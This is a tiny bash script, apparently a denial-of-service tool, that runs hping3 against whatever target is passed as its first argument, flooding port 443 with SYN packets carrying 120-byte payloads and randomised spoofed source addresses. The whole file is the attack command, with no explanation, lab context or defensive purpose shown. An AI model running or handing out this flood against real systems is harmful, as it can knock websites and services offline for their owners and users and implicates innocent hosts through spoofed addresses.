#!/bin/bash

sudo hping3 $1 -q -n -d 120 -S -p 443 --flood --rand-source
